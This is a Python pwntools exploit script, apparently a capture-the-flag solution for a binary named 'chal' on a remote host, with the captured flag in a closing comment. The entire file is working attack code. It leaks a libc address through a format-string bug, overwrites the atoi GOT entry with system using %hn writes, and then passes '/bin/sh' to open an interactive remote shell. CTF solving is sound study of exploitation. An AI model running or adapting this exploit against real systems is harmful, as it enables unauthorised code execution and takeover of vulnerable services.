#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal") 
libc = ELF("//usr/lib/x86_64-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.35.so")

context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)

def debug():
    gdb.attach(p, gdbscript = """
        b* 0x40157A
        continue
    """)
    pause() 

# debug()

while True: 
    # p = process(exe.path)
    p = remote("152.69.210.130", 2004)

    sl  = p.sendline
    sa  = p.sendafter
    sla = p.sendlineafter
    rl  = p.recvline
    ru  = p.recvuntil

    ru(b"Lucky number: ")
    lucky_number = int(rl().strip(), 10)

    if lucky_number == 68: 
        break  
    else: 
        p.close() 

sl(b"-")
payload = b"%67$p"
sla(b"name: ", payload) 

libc_leak = int(rl().strip(), 16)
libc_base = libc_leak - libc.symbols["__libc_start_main"] - 128 
system = libc_base + libc.symbols["system"]

log.info(f"libc base = {hex(libc_base)}")
log.info(f"libc leak = {hex(libc_leak)}")
log.info(f"system = {hex(system)}")

package = {
    (system >> 0 ) & 0xFFFF : exe.got["atoi"],
    (system >> 16) & 0xFFFF : exe.got["atoi"] + 2, 
    (system >> 32) & 0xFFFF : exe.got["atoi"] + 4 
}
sorted_package = sorted(package) 

payload =  f"%{sorted_package[0]}c%12$hn".encode() 
payload += f"%{sorted_package[1] - sorted_package[0]}c%13$hn".encode() 
payload += f"%{sorted_package[2] - sorted_package[1]}c%14$hn".encode() 
payload = payload.ljust(0x30, b"P") 
payload += flat(
    package[sorted_package[0]],
    package[sorted_package[1]],
    package[sorted_package[2]]
)

sl(b"-") 
sla(b"name: ", payload) 

sl(b"1")
sla(b"guess: ", b"/bin/sh")

p.interactive() 
# ISITDTU{a0e1948f76e189794b7377d8e3b585bfa99d7ed0de7e6a6ff01c2fd95bdf3f72}